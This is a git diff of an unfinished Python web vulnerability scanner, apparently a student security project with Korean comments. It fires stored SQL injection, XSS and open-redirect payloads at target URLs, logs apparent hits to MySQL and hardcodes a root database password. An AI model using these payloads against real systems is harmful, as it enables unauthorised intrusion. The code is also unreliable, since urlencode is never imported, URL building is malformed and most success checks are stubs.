@@ -1,81 +1,145 @@
-#visual studio code로 돌렸습니당
-
 import requests 
+import mysql.connector
+import pymysql
 
 class AttackModule:
     def __init__(self):
-        self.payloads = {
-            'sql': ['1 OR 1=1', 'a' + "' OR 'a'='a", '100 UNION SELECT 1,username,password FROM users'],
-            'xss': ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(\'XSS\')">', '<body onload=alert("XSS")>'],
-            'openredir': ['https://www.evil.com', 'http://malicious.com', '//attacker.com']
-        }
-        self.urls = ['http://localhost/news/1', 'http://localhost/xss', 'http://localhost/open_redirect']
-        self.parsed_data = {
-            'sql': ['id', 'user', 'pass'],
-            'xss': ['name', 'comment', 'search'],
-            'openredir': ['next', 'url', 'redirect']
+        attackDB = mysql.connector.connect(host="localhost",user="root",password="1111",database="attackDB")
+        mycursor = attackDB.cursor()
+       
+       # 테이블 이름과 공격 유형을 매핑
+        tables_attack_types = [('payloads_sqli', 'sql'), ('payloads_xss', 'xss'), ('payloads_or', 'openredir')]
+
+        # 공격 유형별로 페이로드 가져오기
+        self.payloads = {}
+        for table, attack_type in tables_attack_types:
+            mycursor.execute(f"SELECT payload FROM {table}")
+            results = mycursor.fetchall()
+            self.payloads[attack_type] = [row[0] for row in results]
+
+        # URL 가져오기
+        mycursor.execute("SELECT url FROM urls")
+        results = mycursor.fetchall()
+        self.urls = [row[0] for row in results]
+
+        # 공격 유형별로 데이터 가져오기
+        self.data = {
+            'sql': self.get_data_for_attack_type(mycursor, 'sqli_data'),
+            'xss': self.get_data_for_attack_type(mycursor, 'xss_data'),
+            'openredir': self.get_data_for_attack_type(mycursor, 'or_data')
         }
 
-# __init__(self) 메서드부분
-# DB로 연결해서 들고와야 하는 payloads, urls, parsed_data(데이터 파라미터)
-# 데이터 불러오기 참고 (개인페이지 - 'ATTACK 모듈'안에 정리)
+    def get_data_for_attack_type(self, cursor, table):
+        cursor.execute(f"SELECT data FROM {table}")
+        results = cursor.fetchall()
+        return [row[0] for row in results]
+            
+    def send_request(self, method, url, data, payload, vuln):
+        try:
+            if method in ['GET']:
+                if vuln == 'sql':
+                    full_url_sql = f"{url}{urlencode(data)}{payload}"
+                    print(f"Sending {method} request to: {full_url_sql}")
+                    response_sql = requests.request(method, full_url_sql)
+                    self.analyze_response(url, data, payload, response_sql, vuln)
+                elif vuln == 'xss':
+                    full_url_xss = f"{url}{urlencode(data)}{urlencode(payload)}"
+                    print(f"Sending {method} request to: {full_url_xss}")
+                    response_xss = requests.request(method, full_url_xss)
+                    self.analyze_response(url, data, payload, response_xss, vuln)
+                elif vuln == 'openredir':
+                    full_url_or = f"{url}{urlencode(data)}{urlencode(payload)}"
+                    print(f"Sending {method} request to: {full_url_or}")
+                    response_or = requests.request(method, full_url_or)
+                    self.analyze_response(url, data, payload, response_or, vuln)
+                else:
+                    print("Invalid attack type")
+                    return
 
-    def send_requests(self):
-        vulnerabilities = ['sql', 'xss', 'openredir']
-        for vuln in vulnerabilities:
-            for url in self.urls:
-                for data in self.parsed_data[vuln]:
-                    for payload in self.payloads[vuln]:
-                        print(f"Testing {vuln} vulnerability...")
-                        full_url = f"{url}?{data}={payload}"
-                        print(f"Sending request to: {full_url}")
-                        try:
-                            response = requests.get(full_url)
-                            self.analyze_response(url, data, payload, response, vuln)
-                        except requests.exceptions.RequestException as e:
-                            print(f"Request failed: {e}")
-# vulnerabilities 취약점 유형 별 취약점 테스트 수행
-# 패킷을 만들어 http/https get 요청을 보냄
-# 응답 분석하여 각 취약점 유형에 따른 성공 여부를 따로따로 저장하기
-# full_url_sql , full_url_xss, full_url_o.r 구분해서 패킷보내야하지 않을까
+
+            elif method in ['POST', 'PUT']:
+                if vuln == 'sql':
+                    data_sql = {data: payload}
+                    print(f"Sending {method} request to: {url}")
+                    headers = {'Content-Type': 'application/json'}
+                    response_sql = requests.request(method, url, json=data_sql, headers=headers)
+                    self.analyze_response(url, data, payload, response_sql, vuln)
+                elif vuln == 'xss':
+                    data_xss = {data: payload}
+                    print(f"Sending {method} request to: {url}")
+                    headers = {'Content-Type': 'application/json'}
+                    response_xss = requests.request(method, url, json=data_xss, headers=headers)
+                    self.analyze_response(url, data, payload, response_xss, vuln)
+                elif vuln == 'openredir':
+                    data_or = {data: payload}
+                    print(f"Sending {method} request to: {url}")
+                    headers = {'Content-Type': 'application/json'}
+                    response_or = requests.request(method, url, json=data_or, headers=headers)
+                    self.analyze_response(url, data, payload, response_or, vuln)
+                else:
+                    print("Invalid attack type")
+                    return
+            else:
+                print(f"Invalid method: {method}")
+                return
+        except requests.exceptions.RequestException as e:
+            print(f"{method} request failed: {e}")
+
+
+# full_url_sql , full_url_xss, full_url_o.r 구분해서 패킷을 요청하고 구분해서 응답을 받을 수 있게 하기
 # XSS 취약점일 경우 패킷응답을 받고 고유값을 이용해 reflected XSS와 stored XSS를 구분할 수 있어야함
 # 그 전에 각 페이로드의 MD5 해시를 사용하여 고유값을 생성
-#(보호기법 우회 코드) 반드시 필요할듯
-# 여기서 패킷 응답에 에러가 날 경우 예외 처리 어떻게..
 
-# (+) save_successful_attack  (공격 성공 시 DB에 기록하는 함수)
+
 # success_responses 테이블에 기록될 수 있게
-    
-    def save_successful_attack(self, url, data, payload, response):
-    # 공격 성공 시 'success_responses' 테이블에 기록
-        self.cursor.execute('''
-        INSERT INTO success_responses (url, data, payload, response)
-        VALUES (?, ?, ?, ?)
-    ''', (url, data, payload, response))
-# 성공 URL,DATA,PAYLOAD, 패킷 응답
-
-
-# success_xss, success_sqli, success_o.r
+# success_xss, success_sqli, success_o.r 이렇게?
 # 각 함수별로 성공url,parsed_data,payloads,packet이 안에 들어가도록 
 
 
     def analyze_response(self, url, data, payload, response, vuln):
-        if vuln == 'sql':
-            if response.status_code == 500:
-                print(f"SQL Injection attack succeeded: {url}")
-            else:
-                print(f"SQL Injection attack failed: {url}")
-        elif vuln == 'xss':
-            if "<script>" in response.text:
-                print(f"XSS attack succeeded: {url}")
-            else:
-                print(f"XSS attack failed: {url}")
-        elif vuln == 'openredir':
-            if response.status_code == 302 and payload in response.headers['Location']:
-                print(f"Open Redirection attack succeeded: {url}")
-            else:
-                print(f"Open Redirection attack failed: {url}")
+        conn = pymysql.connect(host='localhost', user='root', password='1111', db='attackDB')
+        cursor = conn.cursor()
 
+        # Create table if not exists????
+        cursor.execute(f'''CREATE TABLE IF NOT EXISTS success_responses_{vuln}
+                        (url TEXT, data TEXT, payload TEXT, vuln TEXT, status_code INT, error_message TEXT)''')
+
+        if response.status_code == 200 or response.status_code == 302:
+            print("Attack might have been successful")
+            cursor.execute(f"INSERT INTO success_responses_{vuln} VALUES (%s,%s,%s,%s,%s,%s)",
+                        (url, data, payload, vuln, response.status_code, "Attack might have been successful"))
+        else:
+            print("Attack failed")
+
+        # Check if any SQL error messages are present in the response
+        sql_errors = ['you have an error in your SQL syntax',
+                    'Server Error in',
+                    'Fatal error',
+                    'Microsoft JET Database Engine error',
+                    'ORA-00933',
+                    'Microsoft OLE DB Provider for ODBC Drivers',
+                    'PSQLException',
+                    'Unclosed quotation mark after the character string']
+        
+        #DB에서 가져오면 좋을것 같음!!!! sql_errors.txt, xss_errors.txt, o.r_errors.txt
+
+        if vuln == 'sql':
+            for error in sql_errors:
+                if error in response.text:
+                    print(f"SQL Injection was successful. Error message: {error}")
+                    cursor.execute(f"INSERT INTO success_responses_{vuln} VALUES (%s,%s,%s,%s,%s,%s)",
+                                (url, data, payload, vuln, response.status_code, error))
+        elif vuln == 'xss':
+            # Add your XSS success check logic here
+            pass
+        elif vuln == 'openredir':
+            # Add your Open Redirection success check logic here
+            pass
+
+        conn.commit()
+        conn.close()
+
+# 응답 분석하여 각 취약점 유형에 따른 성공 여부를 따로따로 저장하기
 # 분석모듈은 아마 이부분을 구현해야하지 않을까..?
 # attack 모듈로 부터 받은 success_xss, success_sqli, success_o.r 
 # 성공 여부 확인 코드 
